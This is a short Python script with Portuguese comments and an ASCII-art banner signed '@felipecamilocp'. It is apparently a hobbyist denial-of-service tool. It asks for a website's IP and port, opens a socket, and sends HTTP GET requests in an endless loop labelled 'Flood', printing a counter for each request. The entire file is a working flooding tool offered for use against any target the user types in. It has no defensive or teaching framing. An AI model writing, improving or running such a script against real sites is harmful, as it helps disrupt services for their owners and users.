# Bibliotecas
import socket
from colorama import Fore, Back, Style
import os

# Clear
os.system ("clear")

#ASCII
print (Fore.RED + """⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠅⠀⠀⠀⠀⠀⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⢸⠀@felipecamilocp⠀""")

# Armazenaveis

numero_sockets = 0
alvo = input (Fore.GREEN + "\nDigite o IP do site: ")
porta = int(input(Fore.YELLOW + "Digite a porta desejada: "))
data = f"GET / HTTP/1.1\r\nHost: {alvo}\r\n\r\n"

# Flood e Criação
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((alvo, porta))
	
while True:
	client_socket.sendall(data.encode())
	numero_sockets += 1
	print (Fore.MAGENTA + f"{numero_sockets} Solicitação HTTP (Conexão Aberta)")